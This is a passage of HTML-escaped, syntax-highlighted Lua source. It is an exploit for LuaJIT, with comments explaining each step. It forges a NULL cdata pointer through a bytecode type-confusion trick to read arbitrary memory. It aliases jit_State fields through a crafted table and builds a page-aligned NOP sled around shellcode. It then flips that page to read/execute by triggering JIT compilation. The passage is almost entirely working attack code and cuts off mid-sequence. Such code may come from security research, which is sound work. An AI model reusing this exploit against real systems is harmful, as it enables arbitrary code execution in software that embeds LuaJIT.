    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;istr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;istr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_uint32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- The following three lines result in the local variable&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- called &quot;memory&quot; being `cdata&amp;lt;const char *&amp;gt;: NULL`. We can&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- subsequently use this variable to read arbitrary memory&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- (one byte at a time). Note again the KPRI trick to change&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- the high 32 bits of a TValue. In this case, the low 32 bits&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- end up pointing to the bytecode instructions at the top of&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- this function wrapped in `if false`.&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32758&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Turned into KPRI(cdata)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- Helper function to read a uint32_t from any memory location.&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;m_uint32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
      &lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;do&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;memory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
      &lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- Helper function to extract the low 32 bits of a TValue.&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- In particular, for TValues containing a GCobj*, this gives&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- the GCobj* as a uint32_t. Note that the two memory reads&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- here are GCfuncL::uvptr[1] and GCupval::v.&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m_uint32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m_uint32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;low32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tv&lt;/span&gt;
      &lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m_uint32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- Helper function which is the inverse of s_uint32: given a&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- 32 bit number, returns a four byte string.&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ub4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
      &lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;do&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;resync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
      &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
      &lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hexdump_print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&#39;&lt;/span&gt;
        &lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;do&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;then&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;string.format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;%02x&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39; &#39;&lt;/span&gt;
        &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- The following four lines result in the local variable&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- called &quot;mctab&quot; containing a very special table: the&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- array part of the table points to the current Lua&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- universe&#39;s jit_State::patchins field. Consequently,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- the table&#39;s [0] through [4] fields allow access to the&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- mcprot, mcarea, mctop, mcbot, and szmcarea fields of&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- the jit_State. Note that LuaJIT allocates the empty&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- string within global_State, so a fixed offset from the&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- address of the empty string gives the fields we&#39;re&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- after within jit_State.&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mctab_s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0\0\99\4\0\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ub4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;low32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2748&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0\0\0\0\0\0\0\0\0\0\5\0\0\0\255\255\255\255&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mctab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;low32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mctab_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mctab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32757&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Turned into KPRI(table)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- Construct a string consisting of 4096 x86 NOP instructions.&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;--local nop4k = &quot;\144&quot;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nop4k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;--[[&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    local zeros = &#39;\0&#39;&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    for i = 1, 12 do&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;        zeros = zeros .. zeros&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    end&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    --]]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;do&lt;/span&gt; 
        &lt;span class=&quot;n&quot;&gt;nop4k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nop4k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nop4k&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- Create a copy of the shellcode which is page aligned, and&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- at least one page big, and obtain its address in &quot;asaddr&quot;.&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ashellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nop4k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nop4k&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;low32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ashellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;asaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;--print(asaddr)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;--hexdump_print(0x100779f8, 0x30)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- The following seven lines result in the memory protection of&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- the page at asaddr changing from read/write to read/execute.&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- This is done by setting the jit_State::mcarea and szmcarea&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- fields to specify the page in question, setting the mctop and&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- mcbot fields to an empty subrange of said page, and then&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- triggering some JIT compilation. As a somewhat unfortunate&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- side-effect, the page at asaddr is added to the jit_State&#39;s&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- linked-list of mcode areas (the shellcode unlinks it).&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mcarea&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mctab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mctab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mctab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1022&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mctab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mctab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mctab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mctab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mctab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1022&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
